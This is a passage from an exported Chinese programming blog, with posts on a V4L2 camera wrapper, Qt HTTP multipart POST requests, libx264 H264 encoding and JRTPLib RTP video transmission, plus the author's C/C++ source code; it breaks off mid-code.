#include &lt;sys/ioctl.h>
//mmap,munmap
#include &lt;sys/mman.h>


#include &lt;stdarg.h>

#define CLEAR_MEM(x) memset(&amp;(x),0,sizeof(x))

enum yV4l2Cmd&#123;

    yVIDIOC_QUERYCAP = 0,//Get Camera Capability
    yVIDIOC_ENUM_FMT = 1,//Get Camera all support-format
    yVIDIOC_S_FMT = 2,//Set Img Format
    yVIDIOC_G_FMT = 3,//Get Img Format
    yVIDIOC_REQBUFS = 4,//Req Video buf
    yVIDIOC_STREAMON = 5,//Start stream
    yVIDIOC_STREAMOFF = 6,//Stop stream
    yVIDIOC_S_PARM = 7,//Set Fps info
    yVIDIOC_G_PARM = 8,//Get Fps info
    yVIDIOC_DQBUF = 9,//delete buf from out queue
    yVIDIOC_QBUF = 10,//put buf to in queue
	yMMAPTOVEDIOBUF = 11,
	yUNMMAPTOVEDIOBUF = 12,
	yPUTVEDIOALLBUFTOQUEUE = 13,

&#125;;


typedef struct &#123;
    
    void * start;
    long len;
&#125; IMG_BUF;

typedef struct ymv4l2&#123;
	
	int camera_fd;//camara file descriptor
	IMG_BUF *img_buf;//img buf head
	
	struct v4l2_buffer normal_buf;
	struct v4l2_fmtdesc desc_fmt;
    struct v4l2_capability cap;
    struct v4l2_format stream_fmt;
    struct v4l2_requestbuffers reqbuf;
	struct v4l2_streamparm stream_parm;
    enum v4l2_buf_type type;
	
&#125;yMV4L2; 



int yInitMV4l2(const char * pathname, yMV4L2 * mvl);
int yDestroyMV4l2(yMV4L2 * mvl);
int yIoctlV4l2(enum yV4l2Cmd cmd,...);

//int OpenCamera(const char * pathname);
//int GetCapability(void);
//int GetAllSupportFormat(void);
//int SetFrameInfo(void);//to set fps
//int GetFrameInfo(void);
//int SetImgFormat(void);
//int GetImgFormat(void);
//int RequestVedioBuf(void);
//int MMapToVedioBuf(void);
//int PutVedioBufToQueue(void);
//int UnMMapToVedioBUf(void);
//int StartStream(void);
//int StopStream(void);
//int ConfigV4l2(void);
//int GetVedioBufFromQueue(void);
//int PutVedioBufToQueue(void);

#ifdef __cplusplus
#if __cplusplus
&#125;
#endif
#endif /* __cplusplus */ 


#endif





后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>v4l2</tag>
        <tag>毕业设计</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt HTTP网络相关GET，POST（HTTP 模拟POST 表单(multipartform)最简单和正式的方法）</title>
    <url>/2017/08/07/blog_idx_036/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  Ubuntu 16.04 LTS
  抓包工具：wireshark
前言

  无




Qt HTTP



Qt网络相关的三个主要类QNetworkAccessManager,QNetworkRequest,QNetworkReply。一般的使用方法就是：QNetworkRequest添加头和地址等信息，QNetworkAccessManager发起请求，QNetworkReply对服务器回应的响应。


关于Qt实现一般的POST和GET，其实我们去看帮助文档就可以了，如下图所示。



    
        
    
 
  通过这里我们可以发现，get的话只需要把request信息填好，交给manager提交就好了。重点我们需要关注post的几个重载函数。本文只分析第二个和第三个，第一个没用过，不清楚。

QNetworkReply *post(const QNetworkRequest &amp;request, const QByteArray &amp;data)//此函数，就是非常裸奔的模拟表单请求，虽然比较复杂，但是绝对直观有效。

QNetworkReply *post(const QNetworkRequest &amp;request, QHttpMultiPart *multiPart)//此函数就是Qt官方带的多表单的Post正式的方法



在具体分析之前，我不得不说一说HTTP协议的部分内容。（这里本人强烈建议，如果要分析各种网络协议，请使用wireshark，她会在网络五层结构中清晰的展现内容）


    3.1 下面是一个普通http请求的抓包截图(打开csdn官网)

    
        
    
 
  图中是典型的HTTP GET请求的内容。我们要关注的就是User-Agent、Accept、Get这几个域就可以了

    
        
    
 
  上图就是一个典型的POST 多表单请求抓包分析。我们只需要关注：Content-type这个最重要的域。后面MIME multipart部分就是上传的图片。这里最重要的是type中的boundary这是一个唯一的字符串，做标识使用，也做为表单的不同域的分隔符。
    3.2 对于详细的HTTP 协议的分析，请自行百度，这里就不做详细的分析。


关于Qt 官方正式 multipartform 实例代码(其实这里就是：QHttpMultiPart、QHttpPart)(主体部分来至于Qt帮助文档，但是这个example有点毛病的)


    proc_request = new QNetworkRequest();
	proc_manager = new QNetworkAccessManager();	      
	connect(proc_manager,SIGNAL(finished(QNetworkReply*)),\
		this,SLOT(YOUR_SLOT_FUNCTION(QNetworkReply*)));//连接槽函数

	  QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

  QHttpPart textPart;
  textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"text\""));
  textPart.setBody("my text");

  QHttpPart imagePart;
  imagePart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("image/jpeg"));
  imagePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"image\""));
  QFile *file = new QFile("image.jpg");
  file->open(QIODevice::ReadOnly);
  imagePart.setBodyDevice(file);
  file->setParent(multiPart); // we cannot delete the file now, so delete it with the multiPart

  multiPart->append(textPart);
  multiPart->append(imagePart);
  
  proc_request->setUrl("http://xxxxxxxxxxxxx");
//**************自我添加部分****************************
QString bd = "fasdlkfjaslkdgj;lkadjglk;";
multipart->setBoundary(bd.toLatin1());
proc_request->setHeader(QNetworkRequest::ContentTypeHeader,\
"multipart/form-data;boundary="+bd);
//****************自我添加部分*************************
proc_manager->post(*proc_request,multiPart);
  对于上面代码的分析：我不知道为何，只有我显示指定Boundary之后，才能够正确提交post，所以自我添加部分是非常重要的，不加就是不行，这是在实际分析出的。（官方关于这个问题的说明：Usually, you do not need to generate a boundary yourself; upon construction the boundary is initiated with the string “boundary_.oOo._” followed by random characters, and provides enough uniqueness to make sure it does not occur inside the parts itself.）（上面说其实我们不显示指定，它也是会自动给你添加boundary的，但是我的项目中就不行，估计是我项目中哪里没弄对吧，不去折腾了，我就显示指定了，如果有那个童鞋去实验一波，不用指定也可以成功post，请来告诉我一声，哎，真特么蛋疼，下班了~~~~~~~~~）




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>GUI开发</category>
        <category>网络</category>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>qt</tag>
        <tag>HTTP</tag>
        <tag>HTTP-GET</tag>
        <tag>HTTP-POST</tag>
      </tags>
  </entry>
  <entry>
    <title>毕设系列之Libx264实时视频流（YUV 420P转H264视频编码篇）</title>
    <url>/2017/08/07/blog_idx_035/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  Ubuntu 16.04 LTS
前言

  无




Libx264实时视频流

  本文的技术实现部分参考雷博士的这篇文章。http://blog.csdn.net/leixiaohua1020/article/details/42078645


现在网上关于H264的文章有很多，但是我个人认为最好的就是雷霄骅博士的x264部分的文章最详细。所以许多的细节部分，我推荐大家去雷博士的blog去看。本文只提及我们使用Libx264时候，我们要注意的问题。


使用Libx264时候，我们需要关注的东西（下面用我的代码来说明假如我们要使用Libx264,那么我们需要注意的几个事情）。


//encoder
	x264_t * pX264Handle;//结构体是一个编码器实例句柄,要使用这个编码库，我们必须有一个这种变量，没有为啥。
//param
	x264_param_t * pX264Param;//这个结构体就比较重要了，他是我们设置编码器参数的载体，我们必须具体的了解各种参数的意义。具体参数在下一节进行分析。
//input,output pic
	x264_picture_t *pPic_In;//这就是YUV输入图像和输出图像的载体，这里面有一个pts参数需要注意，下面小节进行说明。
	x264_picture_t *pPic_Out;
//output h264 stream
	x264_nal_t * pNals;//这个也是比较重要的一个东西，他的作用是用来保存编码后，网络抽象层所保存的数据(NAL HEADER,NAL BODY),想具体了解，可以去看H264编码原理。
//user config callback
	//UESER_CONF_CALLBACK yX264_UserConfig;
	int (*yX264_UserConfig)(struct ymx264 * mvl);//私有，忽略
//pi_nal is the number of NAL units 
	int pi_nal;//网络抽象单元个数


编码器参数分析


//* cpuFlags  
   mvl->pX264Param->i_threads  = X264_SYNC_LOOKAHEAD_AUTO;//* 取空缓冲区继续使用不死锁的保证. 
//* 视频选项  
   mvl->pX264Param->i_width   = FRAME_WIDTH; //* 要编码的图像宽度.  
   mvl->pX264Param->i_height  = FRAME_HEIGHT; //* 要编码的图像高度  
mvl->pX264Param->i_frame_total = 0; //* 编码总帧数.不知道用0.  
/* Force an IDR keyframe at this interval */
   mvl->pX264Param->i_keyint_max = 10; //这个参数很重要,控制i帧的频率
 
mvl->pX264Param->b_repeat_headers = 1;  // 重复SPS/PPS 放到关键帧前面//做实时流播放，此参数必须ENABLE
//* 流参数  
//* how many b-frame between 2 references pictures */
   mvl->pX264Param->i_bframe  = 5;  
//
   mvl->pX264Param->b_open_gop  = 0;  
//* Keep some B-frames as references: 0=off, 1=strict hierarchical, 2=normal */
   mvl->pX264Param->i_bframe_pyramid = 0;  
//
   mvl->pX264Param->i_bframe_adaptive = X264_B_ADAPT_TRELLIS;  
 
 
//* Log参数，不需要打印编码信息时直接注释掉就行  
   //mvl->pX264Param->i_log_level  = X264_LOG_DEBUG; 

//* 速率控制参数  
   //pX264Param->rc.i_bitrate = 1024 * 10;//* 码率(比特率,单位Kbps) ，重要

//* muxing parameters  帧率控制，重要。
   mvl->pX264Param->i_fps_den  = 1; //* 帧率分母
   mvl->pX264Param->i_fps_num  = Y_STREAM_FPS;//* 帧率分子  

   mvl->pX264Param->i_timebase_den = mvl->pX264Param->i_fps_num;  
   mvl->pX264Param->i_timebase_num = mvl->pX264Param->i_fps_den;  
  最后，我们需要注意一点：关于我们设置的帧率的问题，不一定是设置多少，播放的时候就是多少，只是一个参考值，编码器会尽量的把视频编码为这个帧率。


x264_picture_t * pPic_In-&gt;i_pts += 1; 此参数非常重要。如果不进行设置，视频流将不会正常播放。


 /*
PTS：Presentation Time Stamp。PTS主要用于度量解码后的视频帧什么时候被显示出来
DTS：Decode Time Stamp。DTS主要是标识读入内存中的ｂｉｔ流在什么时候开始送入解码器中进行解码。
*/


关于颜色空间的问题，大家可以去百度YUV 420 ,YUV 422，YUV 444等这些原始图像的存储问题。具体来说，他们分为两类，一种是分组存储（例如：YYYUUUVVV*），一种是交叉存储(例如：YUYV)


此模块我的源代码
ym_x264.h


/*
	FileName:ym_x264.h
	Version:1.0
	Description:
	Created On: 2017-3-19
	Modified date:
	Author:Sky
*/

#ifndef _YM_X264_H
#define _YM_X264_H

#ifdef __cplusplus
#if __cplusplus
extern "C"&#123;
#endif
#endif /* __cplusplus */

#include &lt;stdint.h>
#include &lt;stdio.h>

#include &lt;ym_x264_config.h>

#include &lt;x264.h>

#include &lt;stdlib.h>




#define CLEAR_MEM(x) memset(&amp;(x),0,sizeof(x))

enum yX264Cmd&#123;

	DO_DEFAULT_PRESET = 0,
	DO_DEFAULT_USERCONF = 1,
	DO_PARAM_APPLY_PROFILE = 2,
	OPEN_ENCODER = 3,
	ENCODER_ENCODE = 4,
	
&#125;;
enum yX264ColorSpace&#123;
	
	Y_CSP_I444 = 0,
	Y_CSP_I422 = 1,
	Y_CSP_I420 = 2,
	Y_CSP_YUYV = 3,
&#125;;

//typedef struct ymx264 yMX264;



typedef struct ymx264&#123;
		
//encoder
	x264_t * pX264Handle;
//param
	x264_param_t * pX264Param;
//input,output pic
	x264_picture_t *pPic_In;
	x264_picture_t *pPic_Out;
//output h264 stream
	x264_nal_t * pNals;
//user config callback
	//UESER_CONF_CALLBACK yX264_UserConfig;
	int (*yX264_UserConfig)(struct ymx264 * mvl);
//pi_nal is the number of NAL units 
	int pi_nal;
	
	long cur_pts;
	
&#125;yMX264; 

typedef int (*UESER_CONF_CALLBACK)(yMX264 * mvl);

int yInitMX264(yMX264 * mvl);
int yDestroyMX264(yMX264 * mvl);
int yIoctlX264(enum yX264Cmd cmd,...);
//CSC = ColorSpaceCovert,FIP = Fill In_Pic
int yDoCSC_And_FIP(yMX264 * mvl,enum yX264ColorSpace t_csp, int cache_id);

int yDo_Default_UserConf(yMX264 * mvl);


#ifdef __cplusplus
#if __cplusplus
&#125;
#endif
#endif /* __cplusplus */ 


#endif
ym_x264.c
/*
	FileName:ym_x264.c
	Version:1.0
	Description:
	Created On: 2017-3-19
	Modified date:
	Author:Sky
*/

/*
x264_param_default()：设置参数集结构体x264_param_t的缺省值。
x264_picture_alloc()：为图像结构体x264_picture_t分配内存。
x264_encoder_open()：打开编码器。
x264_encoder_encode()：编码一帧图像。
x264_encoder_close()：关闭编码器。
x264_picture_clean()：释放x264_picture_alloc()申请的资源。
 
存储数据的结构体如下所示。
x264_picture_t：存储压缩编码前的像素数据。
x264_nal_t：存储压缩编码后的码流数据。
*/
#include &lt;ym_x264.h>

uint8_t ImgCache[ImageCacheNum][FRAME_SIZE];
int yInitMX264(yMX264 * mvl)&#123;


	mvl->pX264Param = (x264_param_t *)malloc(sizeof(x264_param_t));
	
//	for (int i = 0; i &lt; ImageCacheNum; i++)&#123;

		mvl->pPic_In = (x264_picture_t *)malloc(sizeof(x264_picture_t));
		mvl->pPic_Out = (x264_picture_t *)malloc(sizeof(x264_picture_t));
		
		mvl->pNals = NULL;

		mvl->pi_nal = 0;

		x264_picture_init(mvl->pPic_Out);  
    	x264_picture_alloc(mvl->pPic_In, FRAME_COLORSPACE, FRAME_WIDTH, FRAME_HEIGHT);

		// PTS FROM 0,AND AUTO INCRESE 1
		mvl->pPic_In->i_pts = 0;
//	&#125;

	mvl->cur_pts = 0;




	return 0;
&#125;
int yDestroyMX264(yMX264 * mvl)&#123;

	// 清除图像区域  
	//for (int i = 0; i &lt; ImageCacheNum; i++)
	x264_picture_clean(mvl->pPic_In);  
    x264_encoder_close(mvl->pX264Handle);  


	free(mvl->pX264Param);
	//for (int i = 0; i &lt; ImageCacheNum; i++)&#123;
	
		free(mvl->pPic_In);
		free(mvl->pPic_Out);
	//&#125;


	return 0;
&#125;

int yIoctlX264(enum yX264Cmd cmd,...)&#123;

	va_list arg;
    va_start(arg,cmd);
    yMX264 *mx264;
    mx264 = va_arg(arg,yMX264 *);
    va_end(arg);

	switch(cmd)&#123;

		case DO_DEFAULT_PRESET:
		&#123;
			/* Get default params for preset/tuning */
			//x264_param_default(pParam);  //this do default set for x264,but can not config some info
    		if( x264_param_default_preset( mx264->pX264Param, "veryfast", "zerolatency" ) &lt; 0 )&#123;
		
				printf("x264_param_default_preset failed!\n");
				return -1;
			&#125;
			break;
		&#125;
		case DO_DEFAULT_USERCONF:
		&#123;
			//va_list arg;
    		//va_start(arg,cmd);
    		//mx264->yX264_UserConfig = va_arg(arg,UESER_CONF_CALLBACK);
			//mx264->yX264_UserConfig = NULL;
			
    		//va_end(arg);

			if ( (*mx264->yX264_UserConfig)(mx264) &lt; 0)&#123;
				
				printf("Do user conf callback failed.\n");
				return -1;
			&#125;

			break;
		&#125;
		case DO_PARAM_APPLY_PROFILE:
		&#123;
			//x264_profile_names[0] = baseline , to set stream-quality
			if (x264_param_apply_profile(mx264->pX264Param, x264_profile_names[0]) &lt; 0 )&#123;

				printf("x264_param_apply_profile failed.\n");
				return -1;
			&#125; 
			break;
		&#125;
		case OPEN_ENCODER:
		&#123;
			//open encoder
			if( (mx264->pX264Handle = x264_encoder_open(mx264->pX264Param)) == NULL)&#123;
				
				printf("x264_encoder_open failed.\n");
				return -1;				
			&#125;
			break;
		&#125;
		case ENCODER_ENCODE:
		&#123;
/*
	x264_encoder_encode:
 *      encode one picture.
 *      *pi_nal is the number of NAL units outputted in pp_nal.
 *      returns the number of bytes in the returned NALs.
 *      returns negative on error and zero if no NAL units returned.
 *      the payloads of all output NALs are guaranteed to be sequential in memory. 
	int     x264_encoder_encode( x264_t *, x264_nal_t **pp_nal, int *pi_nal, x264_picture_t *pic_in, x264_picture_t *pic_out );
*/



			if ( x264_encoder_encode(mx264->pX264Handle, &amp;mx264->pNals, &amp;mx264->pi_nal, mx264->pPic_In, mx264->pPic_Out) &lt; 0)&#123;
				
				printf("x264_encoder_encode failed.\n");
				return -1;					
				
			&#125;
/*
PTS：Presentation Time Stamp。PTS主要用于度量解码后的视频帧什么时候被显示出来
DTS：Decode Time Stamp。DTS主要是标识读入内存中的ｂｉｔ流在什么时候开始送入解码器中进行解码。
*/
			//Presentation Time Stamp。PTS主要用于度量解码后的视频帧什么时候被显示出来
			//MUST DO THIS ,IT DECIDE ,主要用于度量解码后的视频帧什么时候被显示出来
			//mx264->pPic_In->i_pts += 1;
			mx264->pPic_In->i_pts += 1; 
			printf("pts = %d\n",mx264->pPic_In->i_pts);
			break; 
		&#125;
		default :
		&#123;
			printf("No this cmd to analyse\n");
			return -1;
			break;
		&#125;
	&#125;

	return 0;
&#125;

int yDoCSC_And_FIP(yMX264 * mvl,enum yX264ColorSpace t_csp, int cache_id)&#123;

	switch(t_csp)&#123;  
        case Y_CSP_I444:
		&#123;  
/*
            read(fd_in,pPic_In->img.plane[0],FRAME_SIZE);         //Y  
            read(fd_in,pPic_In->img.plane[1],FRAME_SIZE);         //U  
            read(fd_in,pPic_In->img.plane[2],FRAME_SIZE);         //V  
*/
            break;
		&#125;  
        case Y_CSP_I420:
		&#123;  
/*
			#ifndef ENABLE_YUYVTOI420 
            read(fd_in,pPic_In->img.plane[0],FRAME_SIZE);         //Y  
            read(fd_in,pPic_In->img.plane[1],FRAME_SIZE/4);     //U  
            read(fd_in,pPic_In->img.plane[2],FRAME_SIZE/4);     //V  
			#else
			//YUYV to I420
			read(fd_in,Cache,FRAME_SIZE*2);         //read one frame to cache 
			//must set to 0
			int id_u = 0,  id_v = 0 , id_y = 0;
			for (int i = 0; i &lt; FRAME_SIZE*2 ;i+=4)&#123; 
				
				pPic_In->img.plane[0][id_y] = Cache[i];//get Y
				id_y++;
				pPic_In->img.plane[0][id_y] = Cache[i+2];//get Y
				id_y++;
				if ( ((int)((i)/1280)%2) == 0 )&#123;
					pPic_In->img.plane[1][id_u] = Cache[i+1];//get U
					pPic_In->img.plane[2][id_v] = Cache[i+3];//get V
					id_u++;
					id_v++;
				&#125;
			&#125;
	
			#endif
*/
            break;
		&#125; 
		case Y_CSP_YUYV:&#123;
			// firstly,Do YUYV to I420 ,then, Fill in_pic
			int id_u = 0,  id_v = 0 , id_y = 0;
			for (int i = 0; i &lt; FRAME_SIZE ;i+=4)&#123; 
				
				mvl->pPic_In->img.plane[0][id_y] = ImgCache[cache_id][i];//get Y
				id_y++;
				mvl->pPic_In->img.plane[0][id_y] = ImgCache[cache_id][i+2];//get Y
				id_y++;
				if ( ((int)((i)/1280)%2) == 0 )&#123;

					mvl->pPic_In->img.plane[1][id_u] = ImgCache[cache_id][i+1];//get U
					mvl->pPic_In->img.plane[2][id_v] = ImgCache[cache_id][i+3];//get V
					id_u++;
					id_v++;
				&#125;
			&#125;
			break;
		&#125;
		case Y_CSP_I422:
		&#123;  
/*
			
            read(fd_in,pPic_In->img.plane[0],FRAME_SIZE);         //Y  
            read(fd_in,pPic_In->img.plane[1],FRAME_SIZE/2);     //U  
            read(fd_in,pPic_In->img.plane[2],FRAME_SIZE/2);     //V 
*/
            break;
		&#125; 

        default:
		&#123;  
            printf("Colorspace Not Support.\n");  
            return -1;
        &#125;  
	&#125;

&#125;

int yDo_Default_UserConf(yMX264 * mvl)&#123;


	//* cpuFlags  
    mvl->pX264Param->i_threads  = X264_SYNC_LOOKAHEAD_AUTO;//* 取空缓冲区继续使用不死锁的保证. 
	//* 视频选项  
    mvl->pX264Param->i_width   = FRAME_WIDTH; //* 要编码的图像宽度.  
    mvl->pX264Param->i_height  = FRAME_HEIGHT; //* 要编码的图像高度  
	mvl->pX264Param->i_frame_total = 0; //* 编码总帧数.不知道用0.  
	/* Force an IDR keyframe at this interval */
    mvl->pX264Param->i_keyint_max = 10; 
  
	mvl->pX264Param->b_repeat_headers = 1;  // 重复SPS/PPS 放到关键帧前面
	//* 流参数  
	//* how many b-frame between 2 references pictures */
    mvl->pX264Param->i_bframe  = 5;  
	//
    mvl->pX264Param->b_open_gop  = 0;  
	//* Keep some B-frames as references: 0=off, 1=strict hierarchical, 2=normal */
    mvl->pX264Param->i_bframe_pyramid = 0;  
	//
    mvl->pX264Param->i_bframe_adaptive = X264_B_ADAPT_TRELLIS;  
	 
	 
	//* Log参数，不需要打印编码信息时直接注释掉就行  
    //mvl->pX264Param->i_log_level  = X264_LOG_DEBUG; 
 
	//* 速率控制参数  
    //pX264Param->rc.i_bitrate = 1024 * 10;//* 码率(比特率,单位Kbps) 

	//* muxing parameters  
    mvl->pX264Param->i_fps_den  = 1; //* 帧率分母
    mvl->pX264Param->i_fps_num  = Y_STREAM_FPS;//* 帧率分子  

    mvl->pX264Param->i_timebase_den = mvl->pX264Param->i_fps_num;  
    mvl->pX264Param->i_timebase_num = mvl->pX264Param->i_fps_den;  

	return 0;
&#125;




后记

  无
参考文献


http://blog.csdn.net/leixiaohua1020/article/details/42078645







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>linux开发</category>
        <category>流媒体处理</category>
      </categories>
      <tags>
        <tag>h264</tag>
        <tag>编码</tag>
        <tag>实时视频</tag>
        <tag>libx264</tag>
      </tags>
  </entry>
  <entry>
    <title>毕设系列之JrtpLib H264(裸视频数据) 实时视频传输(发送与接受)</title>
    <url>/2017/08/21/blog_idx_037/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  Linux  4.8.0-36-generic #36~16.04.1-Ubuntu SMP Sun Feb 5 09:39:57 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
前言

  无




JRtp



首先直接下载源代码，查看其中的example1和2，里面有关于字符串的发送和接收的例子。先研究一下这个例子中JRTPlib的基本用法。然后就可以接着看下面的部分。（了解的忽略这一部分）


JRTPLib的使用心得。


首先我实现的所有的主要功能都来至于这些类，那就是RTPSession ，RTPSessionParams。其中RTPSession 是核心，所有的其他类都是为这个服务的。它的主要作用是管理一个rtp会话，而另外一个是设置这个会话的参数。


这个库使用的主要流程是建立一个会话对象，为这个会话设置参数，创建会话，循环等待响应和处理会话（也就是发送和接收）。所以这个库的核心就在循环等待这一块，其他的都是约定好的东西，照搬就可以。


现在我们进入正题，也就是循环等待部分（JRTPLib的核心）

发送部分
RTPSession .SendPacket（buf,len）用来发送数据
接收部分
RTPSession .BeginDataAccess();RTPSession .EndDataAccess();之间的部分就是接收和处理RTP数据。





正题，H264裸视频的传输，以实际代码为例。


    a. 首先是H264相关是设定，如果对RTP协议不太了解，可去找找相关资料来看一看就OK了。
this->sess.SetDefaultPayloadType(96);//设置传输类型 ,来至于rtp协议规范 
this->sess.SetDefaultMark(true);      //设置位，true标志此分包是最后一个包，false反之  
this->sess.SetTimestampUnit(1.0/9000.0); //设置采样间隔  
this->sess.SetDefaultTimestampIncrement(10);//设置时间戳增加间隔  
    b. 然后是传输参数的设定
	sessparams.SetOwnTimestampUnit(1.0/10.0); //时间戳单位  
    sessparams.SetAcceptOwnPackets(true);   //接收自己发送的数据包，这里必须设定为true，否则不能够接收到相关的包。 
    sessparams.SetUsePredefinedSSRC(true);  //设置使用预先定义的SSRC,同步源ID，不明白的去看看相关资料
    sessparams.SetPredefinedSSRC(SSRC);     //定义SSRC
```    
&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;c. h264裸视频数据的实时传输（这里有一个非常重要的东西，叫做拆包，学过《计算机网络》的人都应该知道这么一个东西吧），宏CODE_M部分的拆包算法是我写的，另外一部分的是网上传播最宽的一个拆包算法，我没有找到最开始的出处，所以就见谅啦，那位大神，我用来做对照。此外对于H264的传输，一定要知道什么是NALU（header，data），如果不知道去查资料,同时最好去看看RTP协议发送相关的知识。这部分传入的参数为Libx264编码之后生成的Nalu

```c
//Internet 对 pkg-len>1400丢包概率很大（出之于某一篇论文），RTP header 12bytes,RTP pkg-max-len &lt;= 1388
//MTU 48~1500, UDP data max len = 1500 - 20(IP header) - 8(UDP header)
//上面的东西看不懂，请回去翻翻计算机网络
	if ( NaluSize &lt;= MAX_RTP_PKT_LENGTH )  
    &#123;    
        memcpy(Sbuf,p_Nalu,NaluSize);    
        status = this->sess.SendPacket((void *)Sbuf,NaluSize);  
     
        CheckError(status);  
    &#125;   
	else if (NaluSize > MAX_RTP_PKT_LENGTH)&#123;
		
        this->sess.SetDefaultMark(false);//mark that this is not finall pkg
		int k=0,l=0;    
        k = NaluSize / MAX_RTP_PKT_LENGTH;  //k>=1
        l = NaluSize % MAX_RTP_PKT_LENGTH;  //l>=0
		int t=0;//用指示当前发送的是第几个分片RTP包
		int SendLen;
#ifdef CODE_M
		while( (t &lt; k) || ((t == k) &amp;&amp; (l > 0)) )&#123;

			if ( t &lt; k - 1)&#123;//0~k-2,total k - 1 pkgs
				
				memcpy(Sbuf,(p_Nalu+( t * MAX_RTP_PKT_LENGTH)),MAX_RTP_PKT_LENGTH);
				status = this->sess.SendPacket((void *)Sbuf,MAX_RTP_PKT_LENGTH);  
                CheckError(status);  
                  
			&#125;
			else &#123;//last pkg, t == k,l > 0, or (k -1)'th pkg

				if ( (t == k-1) &amp;&amp; ( l == 0 ) || (l > 0) &amp;&amp; ( t == k))&#123;
					
					this->sess.SetDefaultMark(true);

					if ( l > 0 )
						SendLen = l;
					else
						SendLen = MAX_RTP_PKT_LENGTH;

					memcpy(Sbuf,(p_Nalu+( t * MAX_RTP_PKT_LENGTH)),SendLen);
					status = this->sess.SendPacket((void *)Sbuf,SendLen);  
                	CheckError(status);  
                	
				&#125;
				else &#123;//(t == k-1) &amp;&amp; ( l > 0 )
					
					memcpy(Sbuf,(p_Nalu+( t * MAX_RTP_PKT_LENGTH)),MAX_RTP_PKT_LENGTH);
					status = this->sess.SendPacket((void *)Sbuf,MAX_RTP_PKT_LENGTH);  
                	CheckError(status);  
                	
				&#125;
			&#125;
			t++;
			
		&#125;
#else
 while( t &lt; k || ( t==k &amp;&amp; l>0 ) )    
        &#123;    
            if( (0 == t ) || ( t&lt;k &amp;&amp; 0!=t ) )//第一包到最后包的前一包  
            &#123;  
                /*sendbuf[0] = (nalHeader &amp; 0x60)|28;   
                sendbuf[1] = (nalHeader &amp; 0x1f); 
                if ( 0 == t ) 
                &#123; 
                    sendbuf[1] |= 0x80; 
                &#125; 
                memcpy(sendbuf+2,&amp;pSendbuf[t*MAX_RTP_PKT_LENGTH],MAX_RTP_PKT_LENGTH); 
                status = this->SendPacket((void *)sendbuf,MAX_RTP_PKT_LENGTH+2);*/  
                memcpy(Sbuf,&amp;p_Nalu[t*MAX_RTP_PKT_LENGTH],MAX_RTP_PKT_LENGTH);  
                status = this->sess.SendPacket((void *)Sbuf,MAX_RTP_PKT_LENGTH);  
                CheckError(status);  
                t++;  
            &#125;  
            //最后一包  
            else if( ( k==t &amp;&amp; l>0 ) || ( t== (k-1) &amp;&amp; l==0 ))  
            &#123;  
                //设置标志位Mark为1  
                this->sess.SetDefaultMark(true);  
  
                int iSendLen;  
                if ( l > 0)  
                &#123;  
                    iSendLen = NaluSize - t*MAX_RTP_PKT_LENGTH;  
                &#125;  
                else  
                    iSendLen = MAX_RTP_PKT_LENGTH;  
  
                //sendbuf[0] = (nalHeader &amp; 0x60)|28;    
                //sendbuf[1] = (nalHeader &amp; 0x1f);  
                //sendbuf[1] |= 0x40;  
  
                //memcpy(sendbuf+2,&amp;pSendbuf[t*MAX_RTP_PKT_LENGTH],iSendLen);  
                //status = this->SendPacket((void *)sendbuf,iSendLen+2);  
     
                memcpy(Sbuf,&amp;p_Nalu[t*MAX_RTP_PKT_LENGTH],iSendLen);  
                status = this->sess.SendPacket((void *)Sbuf,iSendLen);  
  
                CheckError(status);  
                t++;  
            &#125;  
			
        &#125;  
#endif
	&#125;
    d. h264数据的接收部分,就是通过一个函数来对包进行组包操作，然后得到了传输数据，这部分代码和传输时拆包部分，息息相关。
	if(pack.GetPayloadType() == H264)  
    &#123;  
        //std::cout&lt;&lt;"Got H264 packet：êo " &lt;&lt; rtppack.GetExtendedSequenceNumber() &lt;&lt; " from SSRC " &lt;&lt; srcdat.GetSSRC() &lt;&lt;std::endl;  
        if(pack.HasMarker())//如果是最后一包则进行组包  
        &#123;  
           	  
			//printf("Got a nal unit \n");
			memcpy(this->rframe->pframe + this->cur_size,pack.GetPayloadData(),pack.GetPayloadLength());  		
			this->cur_size += pack.GetPayloadLength();
			this->rframe->use_len = this->cur_size;


//***************************
#define DO_WRITE_FILE
#ifdef DO_WRITE_FILE
			int fd_out = open("rec.h264", O_CREAT | O_RDWR,S_IRWXU|S_IRWXO|S_IRWXG);
			lseek(fd_out, 0, SEEK_END);
			write(fd_out, this->rframe->pframe,this->rframe->use_len); 
			close(fd_out);
#endif
//***************************

            while(1)&#123;
            if ( cir_buf.reserve() > this->rframe->use_len)&#123;

                for (long i = 0; i &lt; this->rframe->use_len; i++)&#123;

                    cir_buf.push_back( *(this->rframe->pframe + i) );
